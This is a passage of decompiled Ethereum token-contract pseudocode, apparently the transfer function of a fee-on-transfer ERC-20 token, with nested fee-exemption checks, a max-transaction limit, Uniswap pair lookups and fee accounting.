                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[0] = arg1
                                mem[32] = 16
                                if stor16[address(arg1)]:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[mem[64] + 32] = address(arg1)
                                    _7892 = mem[64]
                                    mem[mem[64]] = 20
                                    mem[64] = mem[64] + 52
                                    if sha3(mem[_7892 + 32 len mem[_7892]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if arg1 == this.address:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor16[address(arg1)]:
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if stor18:
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if not arg2:
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor19[stor19.length].field_256 = arg2
                                                        if arg2 < 0:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -1:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if arg2 and _fee > -1 / arg2:
                                                            revert with 'NH{q', 17
                                                        if not arg2:
                                                            revert with 'NH{q', 18
                                                        if arg2 * _fee / arg2 != _fee:
                                                            revert with 0, 'SafeMath: multiplication overflow'
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor19[stor19.length].field_256 = arg2
                                                        if arg2 < arg2 * _fee / 100:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[0] += arg2 * _fee / 100
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                        emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                        if arg2 * _fee / 100 > 0:
                                                            emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                    else:
                        mem[0] = msg.sender
                        mem[32] = 16
                        if stor16[address(msg.sender)]:
                            if stor16[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[0] = arg1
                                mem[32] = 16
                                if stor16[address(arg1)]:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[mem[64] + 32] = address(arg1)
                                    _7253 = mem[64]
                                    mem[mem[64]] = 20
                                    mem[64] = mem[64] + 52
                                    if sha3(mem[_7253 + 32 len mem[_7253]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if arg1 == this.address:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor16[address(msg.sender)]:
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if stor18:
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if not arg2:
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor19[stor19.length].field_256 = arg2
                                                        if arg2 < 0:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -1:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if arg2 and _fee > -1 / arg2:
                                                            revert with 'NH{q', 17
                                                        if not arg2:
                                                            revert with 'NH{q', 18
                                                        if arg2 * _fee / arg2 != _fee:
                                                            revert with 0, 'SafeMath: multiplication overflow'
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor19[stor19.length].field_256 = arg2
                                                        if arg2 < arg2 * _fee / 100:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[0] += arg2 * _fee / 100
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                        emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                        if arg2 * _fee / 100 > 0:
                                                            emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                        else:
                            require ext_code.size(address(stor20.field_8))
                            staticcall address(stor20.field_8).factory() with:
                                    gas gas_remaining wei
                            mem[mem[64]] = ext_call.return_data[0]
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            _7171 = mem[64]
                            mem[64] = mem[64] + ceil32(return_data.size)
                            require return_data.size >= 32
                            _7189 = mem[_7171]
                            require mem[_7171] == mem[_7171 + 12 len 20]
                            require ext_code.size(address(stor20.field_8))
                            staticcall address(stor20.field_8).WETH() with:
                                    gas gas_remaining wei
                            mem[mem[64]] = ext_call.return_data[0]
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            _7237 = mem[64]
                            mem[64] = mem[64] + ceil32(return_data.size)
                            require return_data.size >= 32
                            _7273 = mem[_7237]
                            require mem[_7237] == mem[_7237 + 12 len 20]
                            mem[mem[64] + 4] = this.address
                            mem[mem[64] + 36] = address(_7273)
                            require ext_code.size(address(_7189))
                            staticcall address(_7189).getPair(address arg1, address arg2) with:
                                    gas gas_remaining wei
                                   args address(this.address), address(_7273)
                            mem[mem[64]] = ext_call.return_data[0]
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            _7447 = mem[64]
                            mem[64] = mem[64] + ceil32(return_data.size)
                            require return_data.size >= 32
                            _7519 = mem[_7447]
                            require mem[_7447] == mem[_7447 + 12 len 20]
                            if mem[_7447 + 12 len 20] != msg.sender:
                                if stor16[address(msg.sender)]:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[0] = arg1
                                    mem[32] = 16
                                    if stor16[address(arg1)]:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        mem[mem[64] + 32] = address(arg1)
                                        _7895 = mem[64]
                                        mem[mem[64]] = 20
                                        mem[64] = mem[64] + 52
                                        if sha3(mem[_7895 + 32 len mem[_7895]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if arg1 == this.address:
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if msg.sender == address(_7519):
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if stor18:
                                                        if arg2 < 0:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -1:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if not arg2:
                                                            require arg2 <= _maxTxAmount
                                                            require ext_code.size(address(stor20.field_8))
                                                            staticcall address(stor20.field_8).factory() with:
                                                                    gas gas_remaining wei
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            require ext_code.size(address(stor20.field_8))
                                                            staticcall address(stor20.field_8).WETH() with:
                                                                    gas gas_remaining wei
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            require ext_code.size(address(ext_call.return_data[0]))
                                                            staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                    gas gas_remaining wei
                                                                   args address(this.address), address(ext_call.return_data[0])
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            if ext_call.return_data[12 len 20] != arg1:
                                                                stor19.length++
                                                                stor19[stor19.length].field_0 = arg1
                                                                stor19[stor19.length].field_256 = arg2
                                                            if arg2 < 0:
                                                                revert with 'NH{q', 17
                                                            if balanceOf[0] > -1:
                                                                revert with 'NH{q', 17
                                                            if balanceOf[address(msg.sender)] < arg2:
                                                                revert with 'NH{q', 17
                                                            balanceOf[address(msg.sender)] -= arg2
                                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                                revert with 'NH{q', 17
                                                            balanceOf[address(arg1)] += arg2
                                                            emit Transfer(arg2, msg.sender, arg1);
                                                        else:
                                                            if arg2 and _fee > -1 / arg2:
                                                                revert with 'NH{q', 17
                                                            if not arg2:
                                                                revert with 'NH{q', 18
                                                            if arg2 * _fee / arg2 != _fee:
                                                                revert with 0, 'SafeMath: multiplication overflow'
                                                            require arg2 <= _maxTxAmount
                                                            require ext_code.size(address(stor20.field_8))
                                                            staticcall address(stor20.field_8).factory() with:
                                                                    gas gas_remaining wei
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            require ext_code.size(address(stor20.field_8))
                                                            staticcall address(stor20.field_8).WETH() with:
                                                                    gas gas_remaining wei
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            require ext_code.size(address(ext_call.return_data[0]))
                                                            staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                    gas gas_remaining wei
                                                                   args address(this.address), address(ext_call.return_data[0])
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            if ext_call.return_data[12 len 20] != arg1:
                                                                stor19.length++
                                                                stor19[stor19.length].field_0 = arg1
                                                                stor19[stor19.length].field_256 = arg2
                                                            if arg2 < arg2 * _fee / 100:
                                                                revert with 'NH{q', 17
                                                            if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                                revert with 'NH{q', 17
                                                            balanceOf[0] += arg2 * _fee / 100
                                                            if balanceOf[address(msg.sender)] < arg2:
                                                                revert with 'NH{q', 17
                                                            balanceOf[address(msg.sender)] -= arg2
                                                            if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                                revert with 'NH{q', 17
                                                            balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                            emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                            if arg2 * _fee / 100 > 0:
                                                                emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                            else:
                                if stor16[address(msg.sender)]:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[0] = arg1
                                    mem[32] = 16
                                    if stor16[address(arg1)]:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        mem[mem[64] + 32] = address(arg1)
                                        _7919 = mem[64]
                                        mem[mem[64]] = 20
                                        mem[64] = mem[64] + 52
                                        if sha3(mem[_7919 + 32 len mem[_7919]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if arg1 == this.address:
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if stor16[address(arg1)]:
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if stor18:
                                                        if arg2 < 0:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -1:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if not arg2:
                                                            require arg2 <= _maxTxAmount
                                                            require ext_code.size(address(stor20.field_8))
                                                            staticcall address(stor20.field_8).factory() with:
                                                                    gas gas_remaining wei
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            require ext_code.size(address(stor20.field_8))
                                                            staticcall address(stor20.field_8).WETH() with:
                                                                    gas gas_remaining wei
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            require ext_code.size(address(ext_call.return_data[0]))
                                                            staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                    gas gas_remaining wei
                                                                   args address(this.address), address(ext_call.return_data[0])
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            if ext_call.return_data[12 len 20] != arg1:
                                                                stor19.length++
                                                                stor19[stor19.length].field_0 = arg1
                                                                stor19[stor19.length].field_256 = arg2
                                                            if arg2 < 0:
                                                                revert with 'NH{q', 17
                                                            if balanceOf[0] > -1:
                                                                revert with 'NH{q', 17
                                                            if balanceOf[address(msg.sender)] < arg2:
                                                                revert with 'NH{q', 17
                                                            balanceOf[address(msg.sender)] -= arg2
                                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                                revert with 'NH{q', 17
                                                            balanceOf[address(arg1)] += arg2
                                                            emit Transfer(arg2, msg.sender, arg1);
                                                        else:
                                                            if arg2 and _fee > -1 / arg2:
                                                                revert with 'NH{q', 17
                                                            if not arg2:
                                                                revert with 'NH{q', 18
                                                            if arg2 * _fee / arg2 != _fee:
                                                                revert with 0, 'SafeMath: multiplication overflow'
                                                            require arg2 <= _maxTxAmount
                                                            require ext_code.size(address(stor20.field_8))
                                                            staticcall address(stor20.field_8).factory() with:
                                                                    gas gas_remaining wei
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            require ext_code.size(address(stor20.field_8))
                                                            staticcall address(stor20.field_8).WETH() with:
                                                                    gas gas_remaining wei
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            require ext_code.size(address(ext_call.return_data[0]))
                                                            staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                    gas gas_remaining wei
                                                                   args address(this.address), address(ext_call.return_data[0])
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            if ext_call.return_data[12 len 20] != arg1:
                                                                stor19.length++
                                                                stor19[stor19.length].field_0 = arg1
                                                                stor19[stor19.length].field_256 = arg2
                                                            if arg2 < arg2 * _fee / 100:
                                                                revert with 'NH{q', 17
                                                            if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                                revert with 'NH{q', 17
                                                            balanceOf[0] += arg2 * _fee / 100
                                                            if balanceOf[address(msg.sender)] < arg2:
                                                                revert with 'NH{q', 17
                                                            balanceOf[address(msg.sender)] -= arg2
                                                            if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                                revert with 'NH{q', 17
                                                            balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                            emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                            if arg2 * _fee / 100 > 0:
                                                                emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                else:
                    mem[32] = 13
                    require balanceOf[address(msg.sender)] >= arg2
                    require ext_code.size(address(stor20.field_8))
                    staticcall address(stor20.field_8).factory() with:
                            gas gas_remaining wei
                    mem[148] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
